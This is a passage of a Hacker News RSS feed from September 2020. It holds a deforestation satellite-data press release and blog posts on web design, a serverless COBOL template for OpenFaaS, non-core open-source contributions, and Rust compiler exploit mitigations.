<p>The procurement is the result of a comprehensive competitive procurement process led by <a href="http://www.miljo.no/">the Ministry of Climate and Environment</a> through the climate and forest initiative. The contract will be entered into with <a href="https://www.ksat.no/https://www.ksat.no/">Kongsberg Satellite Services (KSAT)</a>, including the subcontractors <a href="https://www.airbus.com/space.html">Airbus</a> and <a href="https://www.planet.com/pulse/planet-ksat-and-airbus-awarded-first-ever-global-contract-to-combat-deforestation/">Planet<em>.</em></a></p>
<p>‚Äì KSAT and its partners <a href="https://www.planet.com/pulse/planet-ksat-and-airbus-awarded-first-ever-global-contract-to-combat-deforestation/">Planet</a> and Airbus delivered the offer with the highest quality, where the world gets a lot of data for our money. This includes both historical data showing what has happened in the past, and frequently updated data over the coming years. The offered licensing terms are particularly good in this bid. It allows everyone to access high-resolution satellite data, without restrictions on use and distribution, says Andreas Dahl-J√∏rgensen, Managing Director of NICFI.</p>
<p><img src="https://www.nicfi.no/files/2020/01/Landsat-from-space.jpg" alt="" width="1280" height="720" srcset="https://www.nicfi.no/files/2020/01/Landsat-from-space.jpg 1280w, https://www.nicfi.no/files/2020/01/Landsat-from-space-300x169.jpg 300w, https://www.nicfi.no/files/2020/01/Landsat-from-space-1024x576.jpg 1024w, https://www.nicfi.no/files/2020/01/Landsat-from-space-768x432.jpg 768w, https://www.nicfi.no/files/2020/01/Landsat-from-space-1130x636.jpg 1130w, https://www.nicfi.no/files/2020/01/Landsat-from-space-400x225.jpg 400w, https://www.nicfi.no/files/2020/01/Landsat-from-space-800x450.jpg 800w" sizes="(max-width: 1280px) 100vw, 1280px"></p>

<p><strong>&nbsp;</strong># # #</p>

<p><strong>NICFI Communications Contact:<br>
</strong>Gunhild Oland Santos-Nedrelid<br>
gsn@kld.dep.no<br>
+ 47 95164906</p>
<p><strong>KSAT Communications Contact:<br>
</strong>Nina Soleng<br>
<a href="mailto:nina@ksat.no">nina@ksat.no</a><br>
+47 906 69 565</p>
<p><strong>Planet Communications Contact:<br>
</strong>Claire Bentley Dale<br>
clairebentley@planet.com</p>
<p><strong>Airbus Communications Contact:<br>
</strong>Fabienne Grazzini<br>
fabienne.grazzini@airbus.com</p>



</div></div>]]>
            </description>
            <link>https://www.nicfi.no/current/new-satellite-images-to-allow-anyone-anywhere-to-monitor-tropical-deforestation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576847</guid>
            <pubDate>Thu, 24 Sep 2020 09:29:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Painting concepts that can improve your website design]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24576559">thread link</a>) | @mctweb
<br/>
September 24, 2020 | https://mctweb.co.uk/articles/design-principles-from-painting | <a href="https://web.archive.org/web/*/https://mctweb.co.uk/articles/design-principles-from-painting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Painting has been around for thousands of years. During this time humans have learned one or two things about design. Important things. And the great news is that many of these fundamentals can be utilised when designing for the web. I have spent many years getting oil paint on every surface in my house. To save you time scrubbing your furniture, clothes and child with turps, I've put some of these fundamentals into a handy list for you.</p>
<h3 id="focal-points">Focal Points</h3>
<p>You generally have focal points in paintings, photography and websites. These are areas that draw your attention. You don't want all of the elements competing for the viewers attention.
From the focal point you have to lead them by the hand to other parts of the painting. This is true with websites. You generally have a banner with the message you want to get across for example your call to action ( CTA ). You need to tell users what to do. Your call to action is usually the second focal point, after their attention is grabbed by an image or illustration. <a href="https://www.sendinblue.com/" rel="nofollow noopener noreferrer" target="_blank">Sendinblue</a> has a great video as their focal point. You look at the video first, you are then drawn to their call to action button.
<img src="https://mctweb.co.uk/articles/sendinblue.png" alt="Sendinblue Focal Point"></p>
<p>Here is a great Waterhouse painting that has an incredibly strong focal point.
<img src="https://mctweb.co.uk/articles/waterhouse.png" alt="Waterhouse Focal Point"></p>
<p>So how do we design a focal point? What makes something stand out? Usually, it is a change in a property of the colour. </p>
<p>The first way is a change in value, this is the easiest way to make something catch the viewers attention. I have made an image and split it in two. Each side has a small square with the same colour in the centre. As you can see, the one on the right draws your attention more. This is because the difference in value between the square and the background is greater than the other half.
<img src="https://mctweb.co.uk/articles/changeinvalues.png" alt="Value Change MCT Web"></p>
<p>The other way to make something stand out is to have a low saturated colour next to a saturated one. Which yellow square stands out more?
<img src="https://mctweb.co.uk/articles/changeinsaturation.png" alt="Saturation Change MCT Web">
The one on the right. This is because the difference in saturation is greater. </p>
<h3 id="interesting-shapes">Interesting Shapes</h3>
<p>To keep an image exciting and interesting when painting or designing, it is vital that you have a variation of shapes.  <a href="https://mctweb.co.uk/articles/%5Bhttps://stapletonkearns.blogspot.com/2015/12/the-encyclopedia-of-dumb-design-ideas.html%5D(https://stapletonkearns.blogspot.com/2015/12/the-encyclopedia-of-dumb-design-ideas.html)">Stapleton Kearns</a> calls ignoring this principle 'Potation' - where everything looks like potatoes ( or similar in shape ). If your site is just made up of only squares, then it can get visually boring for the user. Mix it up by overlapping elements, this also introduces depth.
<img src="https://mctweb.co.uk/articles/clouds.png" alt="Stapleton Kearns"></p>
<p>This image is from the Dutch master Dirk Van Assaerts, which is actually a fictional persona made by Stapleton to highlight dumb design ideas.</p>
<p>On <a href="https://mctweb.co.uk/" rel="nofollow noopener noreferrer" target="_blank">MCT Web</a> I have used overlapping shapes to try and keep the user interested.
<img src="https://mctweb.co.uk/articles/overlapping.png" alt="Overlapping MCT Web"></p>
<h3 id="space-is-important">Space is important</h3>
<p>Space creates interest. For an area to stand out, you need to have other areas that have less in them. This Rockwell painting has loads of negative space. Negative space is the space between things. The white in the shirt and chair split up the background and the focal points. These areas help to frame shapes and draw the eye.</p>
<p>Space is equally important in web design. Take a look at all of this space on <a href="http://google.com/" rel="nofollow noopener noreferrer" target="_blank">google.com</a>. It makes it obvious to the user what they should do.
<img src="https://mctweb.co.uk/articles/space.png" alt="Google dot com">
Then take a look at the famous <a href="https://mctweb.co.uk/articles/%5Bhttps://www.lingscars.com/%5D(https://www.lingscars.com/)">LingsCars</a>. It's not quite so obvious what you should do...
<img src="https://mctweb.co.uk/articles/lings.png" alt="Lings"></p></div></div>]]>
            </description>
            <link>https://mctweb.co.uk/articles/design-principles-from-painting</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576559</guid>
            <pubDate>Thu, 24 Sep 2020 08:32:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I Created an OpenFaaS Template for COBOL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24576472">thread link</a>) | @alexellisuk
<br/>
September 24, 2020 | https://unnecessary.tech/posts/openfaas-cobol/ | <a href="https://web.archive.org/web/*/https://unnecessary.tech/posts/openfaas-cobol/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  
  <h3>Apr 27, 2020</h3>
  
  <p>In early April a <a href="https://www.cnn.com/2020/04/08/business/coronavirus-cobol-programmers-new-jersey-trnd/index.html">couple</a> <a href="https://www.npr.org/2020/04/22/841682627/cobol-cowboys-aim-to-rescue-sluggish-state-unemployment-systems">of</a> <a href="https://arstechnica.com/tech-policy/2020/04/ibm-scrambles-to-find-or-train-more-cobol-programmers-to-help-states/">articles</a> were
published stressing the need for COBOL programmers to once again come forward
to use their skills to get us through a crisis of aging infrastructure. This
wasn‚Äôt the <a href="https://archive.nytimes.com/www.nytimes.com/library/tech/98/12/biztech/articles/27millennium.html?RefId=PjxYEutt2uFFwKZO">first time</a> their expertise was required. Even back in 1998,
COBOL was described as</p>
<blockquote>
<p>‚Äú‚Ä¶ a computer language that runs many of the United States‚Äô mainframe
computers but is so old that relatively few American programmers know it.‚Äù</p>
<p>‚Äî <a href="https://archive.nytimes.com/www.nytimes.com/library/tech/98/12/biztech/articles/27millennium.html?RefId=PjxYEutt2uFFwKZO">Feder &amp; Pollack, ‚ÄúComputers and Year 2000: A Race for Security
(and Against Time)‚Äù, New York Times, 1998</a></p>
</blockquote>
<p>So why do these programs persist for decades? Why are new experts not hired to
maintain this vast amount of COBOL code? The answer is clearly because the
code works, and works well enough for modernization of the infrastructure to
remain a low priority. Although the language gets a lot of blame, the truth is
that much like maintenance of roads and bridges, maintenance of computational
infrastructure has faltered, and nothing is better at showing the cracks in
that infrastructure than a crisis.</p>
<h2 id="modern-cobol">Modern COBOL</h2>
<p>It would be generous to call me a novice COBOL programmer. My interest in
learning more about this ‚Äúancient‚Äù language was piqued by the recent articles.
Is COBOL an unusable relic from the past? Can COBOL even be compiled on the
modern PC with a modern operating system? The answers are a qualified no, and
an unqualified yes. COBOL, like other languages, reflects computing at the
time it was created. Languages do evolve along with the hardware they run on.
Good examples are C and Fortran which have evolved with numerous revisions,
but the paradigms of languages rarely shift. COBOL retains the trappings of
its origins. Its punch-card origins is revealed in its line formatting
(columns 1-6 for line numbers, column 7 to indicate a comment or continuation,
8-72 for statements, and columns 73-80 for marginalia, useful for card
sequence numbering). The memory limits of the time are reflected in the
flexibility of its variable definition blocks.</p>
<p>COBOL also reflects some interesting ideas. It is so verbose that it makes
Java look rather terse, but this is done in the service of readability, which
is also a goal of the Go language. Fundamentally, COBOL is an imperative
language and as such, its basic structures and statements can be fairly easily
decoded by most modern programmers. Although it may look somewhat archaic, and
it may contain a lot of keywords, it is not outlandishly different from other
modern programming languages. The COBOL compiler which runs under
Linux called <a href="https://sourceforge.net/projects/open-cobol/">GnuCOBOL</a>, and can be installed by the debian package
manager on any debian-based distribution. Armed with a tiny bit of knowledge, I
decided to merge the old with the new and write a serverless COBOL function.</p>
<h2 id="google-cloud-run">Google Cloud Run</h2>
<p>My first step in putting a serverless COBOL function online was to use <a href="https://cloud.google.com/run/">Google
Cloud Run</a>, a serverless offering from Google which will host any
containers listening for web requests on an open port defined by the <code>PORT</code>
environment variable (right now this is always port 8080). Cloud Run only
charges when there are active HTTP requests connected to the container, and
allows multiple simultaneous connections to the container. There are a number
of <a href="https://github.com/steren/awesome-cloudrun">examples and tutorials</a> available, and there is even a
sample of a <a href="https://github.com/zachmccormick/fortran-cloudrun">Fortran function</a> which is deployable to Cloud Run.</p>
<p>I do not know how to write a webserver in COBOL, so <a href="https://github.com/devries/cloud-run-cobol">my COBOL
function</a> includes an invocation server written in Go which in turn
runs the COBOL program and returns its output. You can <a href="https://cloud-run-cobol-j6z4gxi7tq-uc.a.run.app/CHRIS">try it out
here</a>, or and put your name as the <code>PATH</code> component to get a
personalized hello message. After announcing what I had done on twitter, I got
the intriguing tweet below, which started a journey into <a href="https://www.openfaas.com/">OpenFaas</a>.</p>
<blockquote><p lang="en" dir="ltr">Rather than maintaining your own wrapper for that, you may find the OpenFaaS watchdog useful with cloudrun. <a href="https://t.co/GC1nEY74SZ">https://t.co/GC1nEY74SZ</a></p>‚Äî Alex Ellis (@alexellisuk) <a href="https://twitter.com/alexellisuk/status/1247431951956480001?ref_src=twsrc%5Etfw">April 7, 2020</a></blockquote>


<h2 id="openfaas">OpenFaaS</h2>
<p>I had heard of <a href="https://www.openfaas.com/">OpenFaaS</a> before, but at the time I felt I was too
busy to learn Kubernetes and OpenFaaS and abandoned it for later. When I got
the tweet, I figured now was the time, so I dove into spending weekends
learning Kubernetes and OpenFaaS. The fact that I had to stay home because of
the pandemic may have also played a role.</p>
<p>The <a href="https://docs.openfaas.com/architecture/watchdog/">watchdog</a> process itself doesn‚Äôt require any specific
knowledge of either Kubernetes or OpenFaaS in order to understand. It serves
the function of the invoker I previously wrote, but with more bells and whistles
including health checks. Essentially the watchdog sends a request into
a process‚Äôs standard input, and returns the standard output. It also provides
several environment variables to describe the URL details and other HTTP
headers. This should be familiar to anyone who has used CGI before.</p>
<p>I found that the Kubernetes landscape had changed and advanced
significantly since my first attempts to use it. In particular Rancher‚Äôs
<a href="https://k3s.io/">k3s</a> project is much easier to run on low-end equipment. The companion <a href="https://github.com/rancher/k3d">k3d</a>
project allows a developer to run k3s in a docker container, making setting up
a development Kubernetes environment extremely easy. To begin working with
clusters, Alex Ellis‚Äôs <a href="https://github.com/alexellis/k3sup">k3sup</a> project can install k3s on any ssh accessible
vm. I fired up k3d and worked through the <a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">Kubernetes
Basics</a> tutorial to become a little familiar with
Kubernetes.</p>
<p>I then moved onto learning <a href="https://www.openfaas.com/">OpenFaaS</a> using the <a href="https://github.com/openfaas/workshop">OpenFaaS
workshop</a>. The workshop is an excellent introduction to OpenFaaS and
presents an easy to follow set of labs to get a programmer quickly up to
speed. I was impressed with the simplicity of OpenFaaS and the ability to do
advanced things like <a href="https://github.com/openfaas/workshop/blob/master/lab7.md">asynchronous
functions</a>,
<a href="https://github.com/openfaas/workshop/blob/master/lab9.md">auto-scaling</a>, and
<a href="https://github.com/openfaas/workshop/blob/master/lab10.md">secrets
management</a>. Plus
it allows a user to avoid vendor lock-in. You can run your code in any cloud
provider or on premises (premises, by the way, is the singular form of that
word, premise is a proposition from which one draws a conclusion or forms an
argument).</p>
<p>In order to create a COBOL function, I created a <a href="https://github.com/devries/docker-cobol">base COBOL container using
debian-slim</a>, and I created an <a href="https://github.com/devries/openfaas-cobol-template">OpenFaaS COBOL
template</a> which contains the information on how to put a COBOL
function into an OpenFaaS container, as well as a sample COBOL function. I
also submitted this template to the OpenFaaS store, so now a COBOL programmer
can easily begin writing an OpenFaaS COBOL function using the commands below.</p>
<div><pre><code data-lang="sh">faas-cli template store pull cobol
</code></pre></div><p>followed by</p>
<div><pre><code data-lang="sh">faas-cli new --lang cobol cobolfunction
</code></pre></div><p>The standard practice for OpenFaaS is to send input data in the body of a POST
request which is then passed to the function via standard input, so I adjusted
the sample COBOL program accordingly. You can invoke the COBOL function
running on my Kubernetes cluster by issuing the following <code>curl</code> command:</p>
<div><pre><code data-lang="sh">curl -d <span>"CHRIS"</span> -H <span>"Content-Type: text/plain"</span> https://tess.unnecessary.tech/
</code></pre></div><h2 id="but-why">But Why?</h2>
<p>Everything I have written so far explains what I did, but why did I do it?
Initially I just wanted to learn a bit about COBOL and have some fun, after
all serverless COBOL sounds a bit like an oxymoron. However, it became a tool
for learning about OpenFaaS, and in the end my COBOL template shows that
OpenFaaS is extremely flexible, and also very easy to use. Creating functions
using your favorite language, or specialized environment is as easy as making
an appropriate Docker container. Although it was not my initial goal, this
project has highlighted the usefulness, maturity, and flexibility of the
OpenFaaS project.  I imagine I will be using OpenFaaS a lot moving forward,
and I encourage others to learn more about it. I would also encourage others
to try any of the other resources I mention above. For anyone who wants to
learn more about COBOL, IBM has <a href="https://github.com/openmainframeproject/cobol-programming-course">published their COBOL course</a> for
free on GitHub as part of the <a href="https://www.openmainframeproject.org/">Open Mainframe</a> project.</p>

  
    
  

        </div></div>]]>
            </description>
            <link>https://unnecessary.tech/posts/openfaas-cobol/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576472</guid>
            <pubDate>Thu, 24 Sep 2020 08:16:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Math/Logic/Verbal Puzzles for virtual team get-togethers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24575977">thread link</a>) | @dixithanoop
<br/>
September 23, 2020 | http://anoopdixith.com/puzzles/ | <a href="https://web.archive.org/web/*/http://anoopdixith.com/puzzles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://anoopdixith.com/puzzles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575977</guid>
            <pubDate>Thu, 24 Sep 2020 06:45:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Uncommon Contributions: Making impact without touching the core of a library]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24575934">thread link</a>) | @dsr12
<br/>
September 23, 2020 | https://koaning.io/posts/cool-commits/ | <a href="https://web.archive.org/web/*/https://koaning.io/posts/cool-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>There are a lot of ways that you can contribute to open source. Frequent contributions include adding features to a library, fixing bugs, or providing examples to a documentation page. All of these contributions are valid, but there are other avenues that you may want to consider too. In this blog post, I‚Äôd like to list a few <em>non-standard</em> examples that might inspire.</p>
<p>I‚Äôll also add some images to highlight why some of these changes matter.</p>
<h2 id="info">Info</h2>
<p><img src="https://koaning.io/posts/cool-commits/info.png"></p>
<p>My first proper PR for <a href="https://github.com/rasaHQ/rasa">Rasa</a> has little to do with the core library. It doesn‚Äôt help in making a chatbot at all. Instead, I upgraded this command:</p>
<pre><code>
rasa --version</code></pre>
<p>Before, this command would list the current version of Rasa. In the new version, it lists:</p>
<ol type="1">
<li>The version of python.</li>
<li>The path to your virtual environment.</li>
<li>The versions of related packages.</li>
</ol>
<p>This is a pretty big feature if you consider the amount of work that goes into submitting a proper bug report. By adding this feature, it is much easier to supply all the relevant information. Just copy and paste the output of this call, and you‚Äôll be writing a much better bug report. No need to fiddle around with commands like:</p>
<pre><code>
pip freeze | grep package-name</code></pre>
<p>This feature has little to do with the core package code but still makes a lot of impact. The debugging process is made easier for both the user and the maintainers of the project.</p>
<h2 id="cron-on-dependencies">Cron on Dependencies</h2>
<p><img src="https://koaning.io/posts/cool-commits/cron.png"></p>
<p>A user for <a href="https://scikit-lego.readthedocs.io/en/latest/">scikit-lego</a>, a package that I maintain, discovered that the reason the code wasn‚Äôt working was because scikit-learn introduced a minor, but breaking, change. To fix this the user added <a href="https://github.com/koaning/scikit-lego/pull/378">a cronjob with Github actions</a> to the project.</p>
<p>Before the PR, we had to hear from users when a dependency introduced breaking changes. By adding a cronjob that would run our unit tests daily, the user removed a blind spot from the project. Every day we now run the unit tests using the latest versions of our dependencies. If the tests break, we can quickly pinpoint what package caused it and create a fix. You can imagine how this might lead to fewer issues for our users.</p>
<p>This feature, again, had little to do with the core package code.</p>
<h2 id="spellcheck">Spellcheck</h2>
<p><img src="https://koaning.io/posts/cool-commits/spelling.png"></p>
<p>For the <a href="https://scikit-lego.readthedocs.io/en/latest/">scikit-lego project</a>, we met a user who was interested in contributing but didn‚Äôt know where to start. The user hadn‚Äôt made many contributions yet and was looking for something easy. His main goal was to get more comfortable with git and to get going with a first open-source contribution. I mentioned that addressing spelling errors is certainly valid, so the user went ahead with this.</p>
<p>The results were somewhat <a href="https://github.com/koaning/scikit-lego/pull/341">epic</a>. He ran a spellchecker, not just against our docs, but also on our source code! It turns out we had some issues in our docstrings as well. While exploring this theme we‚Äôve also discovered flake8 compatible packages that do spellchecking on <a href="https://github.com/MichaelAquilina/flake8-spellcheck">variable names</a>.</p>
<p>Spell-checking was something we hadn‚Äôt considered, and it was a much-appreciated code quality update.</p>
<h2 id="error-messages">Error Messages</h2>
<p><img src="https://koaning.io/posts/cool-commits/error.png"></p>
<p>One of the harder parts of writing a package for other people is getting people to understand how they should use the package. As a maintainer, you cannot imagine what it is like not to understand your own code. New users, on the other hand, can spot this instantly.</p>
<p>This is why a popular entry point for contribution is documentation. Documentation is often read when something goes wrong after the user sees a confusing error, so it makes sense for new users to contribute there. But you can go a step further! Instead of changing the docs, why not write a more meaningful error message?</p>
<p>In <a href="https://github.com/RasaHQ/whatlies/pull/141">whatlies</a>, we‚Äôve recently allowed for optional dependencies. If you try to use a part of the library that requires a dependency that is not part of the base package, then you‚Äôll get this error message.</p>
<pre><code>
In order to use ConveRTLanguage you'll need to install via;

&gt; pip install whatlies[tfhub]

See installation guide here: https://rasahq.github.io/whatlies/#installation</code></pre>
<p>This feature has little to do with the core functionality of the library. Yet, it will do a lot for developer experience.</p>
<h2 id="failing-unit-tests">Failing Unit Tests</h2>
<p><img src="https://koaning.io/posts/cool-commits/test.png"></p>
<p>There‚Äôs a lovely plugin for <a href="https://www.mkdocs.org/">mkdocs</a> called <a href="https://github.com/danielfrg/mkdocs-jupyter">mkdocs-jupyter</a>. It allows you to easily add jupyter notebooks to your documentation pages. When I was playing with it, I noticed that it wasn‚Äôt compatible with a new version of <code>mkdocs</code>. Instead of just submitting a bug to Github, I went the extra mile. I created a PR that contained a failing unit-test for this issue. This was great for the maintainer because it was easier to understand the issue and to fix it.</p>
<p>This feature, again, had little to do with the core package code.</p>

<p><img src="https://koaning.io/posts/cool-commits/rename.png"></p>
<p>Let‚Äôs compare two pieces of code from a library that I maintain.</p>
<h4 id="exibit-a">Exibit A</h4>
<pre><code>
from whatlies.transformer import Pca
pca_plot = emb.transform(Pca(2)).plot_interactive()</code></pre>
<h4 id="exibit-b">Exibit B</h4>
<pre><code>
from whatlies.transformer import pca
pca_plot = emb.transform(pca(2)).plot_interactive()</code></pre>
<h3 id="the-difference">The Difference</h3>
<p>Did you see the difference? In the first example we‚Äôre importing <code>Pca</code> and in the second example <code>pca</code>. The difference is an upper case/lower case letter and this small typo caused a <a href="https://github.com/RasaHQ/whatlies/issues/194">very unintuitive bug</a>.</p>
<p>The bug is related to the file structure of the project.</p>
<pre><code>
whatlies
‚îú‚îÄ‚îÄ __init__.py
‚îú‚îÄ‚îÄ embedding.py
‚îú‚îÄ‚îÄ embeddingset.py
‚îú‚îÄ‚îÄ language
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ __init__.py
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ transformers
    ‚îú‚îÄ‚îÄ __init__.py
    ‚îú‚îÄ‚îÄ pca.py
    ‚îî‚îÄ‚îÄ ...</code></pre>
<p>The <code>Pca</code> class is defined in the <code>pca.py</code> file in the <code>transformers</code> folder. We intended to expose the <code>Pca</code> class via the <code>__init__.py</code> file in the same folder. Unfortunately, by importing <code>pca</code> instead of <code>Pca</code> you‚Äôre getting the submodule instead of the intended class.</p>
<p>A single character could cause a really confusing bug so we had to fix it. So we fixed it by changing the filename from <code>pca.py</code> to <code>_pca.py</code>.</p>
<pre><code>
whatlies
‚îú‚îÄ‚îÄ __init__.py
‚îú‚îÄ‚îÄ embedding.py
‚îú‚îÄ‚îÄ embeddingset.py
‚îú‚îÄ‚îÄ language
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ __init__.py
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ transformers
    ‚îú‚îÄ‚îÄ __init__.py
    ‚îú‚îÄ‚îÄ _pca.py
    ‚îî‚îÄ‚îÄ ...</code></pre>
<p>We didn‚Äôt just do this for <code>_pca.py</code> but for <a href="https://github.com/RasaHQ/whatlies/pull/195/files?file-filters%5B%5D=.py">all files where this error might occur</a>.</p>
<p>Again, this change doesn‚Äôt require you to understand the core code of the library.</p>

<p>Many of the coolest contributions might have nothing to do with the core library. All of the examples that I‚Äôve listed above have been tremendous features for some of the package that I maintain but also for some of the larger code repositories out there. Feel free to remember this when you‚Äôre considering your first contribution.</p>
<!--radix_placeholder_article_footer-->
<p>
    <span>
      Share: &nbsp;
      <a href="https://twitter.com/share?text=Uncommon%20Contributions&amp;url=https%3A%2F%2Fkoaning.io%2Fposts%2Fcool-commits%2F">
        <i></i>
      </a>
      <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fkoaning.io%2Fposts%2Fcool-commits%2F&amp;title=Uncommon%20Contributions">
        <i></i>
      </a>
    </span>
  </p>
<!--/radix_placeholder_article_footer-->
</div></div>]]>
            </description>
            <link>https://koaning.io/posts/cool-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575934</guid>
            <pubDate>Thu, 24 Sep 2020 06:38:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust programming language exploit mitigations]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24575844">thread link</a>) | @DyslexicAtheist
<br/>
September 23, 2020 | https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/ | <a href="https://web.archive.org/web/*/https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>By  on <time itemprop="datePublished" datetime="2020-09-16T00:00:00-07:00">September 16, 2020</time>. <a href="https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/#disqus_thread" data-disqus-identifier="/2020/09/16/rust-lang-exploit-mitigations/"></a></p><div itemprop="articleBody">
    <p>The Rust programming language provides memory[1] and thread[2] safety
guarantees via its ownership[3], references and borrowing[4], and slice
types[5] features. However, Unsafe Rust[6] introduces unsafe blocks, unsafe
functions and methods, unsafe traits, and new types that are not subject to
the borrowing rules.</p>

<p>Parts of the Rust standard library are implemented as safe abstractions over
unsafe code (and historically have been vulnerable to memory corruption[7]).
Furthermore, the Rust code and documentation encourage creating safe
abstractions over unsafe code. This can cause a false sense of security if
unsafe code is not properly reviewed and tested.</p>

<p>Unsafe Rust disables some of the features that provide memory and thread
safety guarantees. This causes programs or libraries to be susceptible to
memory corruption (CWE-119)[8] and concurrency issues (CWE-557)[9]. Modern C
and C++ compilers provide exploit mitigations to increase the difficulty to
exploit vulnerabilities resulting from these issues. Therefore, the Rust
compiler must also support these exploit mitigations in order to mitigate
vulnerabilities resulting from the use of Unsafe Rust. This post is going to
document these exploit mitigations and how they apply to Rust.</p>

<h2 id="exploit-mitigations">Exploit mitigations</h2>

<p>This section documents the exploit mitigations applicable to the Rust
compiler when building programs for the Linux operating system on the AMD64
architecture and equivalent.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> All examples in this section were
built using the Rust compiler version 1.40.0 (2019-12-19) on Debian testing
(Bullseye).</p>

<p>The Rust Programming Language currently has no specification. The Rust
compiler (i.e., rustc) is the language reference implementation. All
references to ‚Äúthe Rust compiler‚Äù in this post refer to the language
reference implementation.</p>

<p>Table I <br>
Summary of exploit mitigations supported by the Rust compiler when building
programs for the Linux operating system on the AMD64 architecture and
equivalent.</p>
<table>
  <tbody><tr>
   <td><strong>Exploit mitigation</strong>
   </td>
   <td><strong>Supported and enabled by default</strong>
   </td>
   <td><strong>Since</strong>
   </td>
  </tr>
  <tr>
   <td>Position-independent executable
   </td>
   <td>Yes
   </td>
   <td>0.12.0 (2014-10-09)
   </td>
  </tr>
  <tr>
   <td>Integer overflow checks
   </td>
   <td>Supported but enabled by default when debug assertions are enabled only.
   </td>
   <td>1.1.0 (2015-06-25)
   </td>
  </tr>
  <tr>
   <td>Non-executable memory regions
   </td>
   <td>Yes
   </td>
   <td>1.8.0 (2016-04-14)
   </td>
  </tr>
  <tr>
   <td>Stack clashing protection
   </td>
   <td>Yes
   </td>
   <td>1.20.0 (2017-08-31)
   </td>
  </tr>
  <tr>
   <td>Read-only relocations and immediate binding
   </td>
   <td>Yes
   </td>
   <td>1.21.0 (2017-10-12)
   </td>
  </tr>
  <tr>
   <td>Heap corruption protection
   </td>
   <td>Yes
   </td>
   <td>1.32.0 (2019-01-17) via OS default or specified allocator
   </td>
  </tr>
  <tr>
   <td>Stack smashing protection
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Forward-edge control flow protection
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Backward-edge control flow protection (e.g., shadow and safe stack)
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
</tbody></table>

<p id="fn:1">1. See
<a href="https://github.com/rust-lang/rust/tree/master/compiler/rustc_target/src/spec">https://github.com/rust-lang/rust/tree/master/compiler/rustc_target/src/spec</a>
for a list of targets and their default options. <a href="#fnref:1" role="doc-backlink">‚Ü©</a></p>

<h3 id="position-independent-executable">Position-independent executable</h3>

<p>Position-independent executable increases the difficulty of the use of code
reuse exploitation techniques, such as return-oriented programming (ROP) and
variants, by generating position-independent code for the executable, and
instructing the dynamic linker to load it similarly to a shared object at a
random load address, thus also benefiting from address-space layout
randomization (ASLR). This is also referred to as ‚Äúfull ASLR‚Äù.</p>

<p>The Rust compiler supports position-independent executable and enables it by
default since version 0.12.0 (2014-10-09)[10]‚Äì[13].</p>

<div><div><pre><code>$ readelf -h target/release/hello-rust | grep Type:
  Type:                              DYN (Shared object file)
</code></pre></div></div>
<p>Fig. 1.‚ÄÉChecking if an executable is a position-independent executable.</p>

<p>An executable with an object type of <code>ET_DYN</code> (i.e., shared object) and not
<code>ET_EXEC</code> (i.e., executable) is a position-independent executable (see Fig.
1).</p>

<h3 id="integer-overflow-checks">Integer overflow checks</h3>

<p>Integer overflow checks protects programs from undefined and unintended
behavior (which may cause vulnerabilities) by checking for results of signed
and unsigned integer computations that cannot be represented in their type,
resulting in an overflow or wraparound.</p>

<p>The Rust compiler supports integer overflow checks, and enables it when
debug assertions are enabled since version 1.0.0 (2015-05-15)[14]‚Äì[17], but
support for it was not completed until version 1.1.0 (2015-06-25)[16]. An
option to control integer overflow checks was later stabilized in version
1.17.0 (2017-04-27)[18]‚Äì[20].</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>u</span><span>:</span> <span>u8</span> <span>=</span> <span>255</span><span>;</span>
    <span>println!</span><span>(</span><span>"u: {}"</span><span>,</span> <span>u</span> <span>+</span> <span>1</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<p>Fig. 2.‚ÄÉhello-rust-integer program.</p>

<div><div><pre><code>$ cargo run
   Compiling hello-rust-integer v0.1.0 (/home/rcvalle/hello-rust-integer)
    Finished dev [unoptimized + debuginfo] target(s) in 0.23s
     Running `target/debug/hello-rust-integer`
thread 'main' panicked at 'attempt to add with overflow', src/main.rs:3:23
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.
</code></pre></div></div>
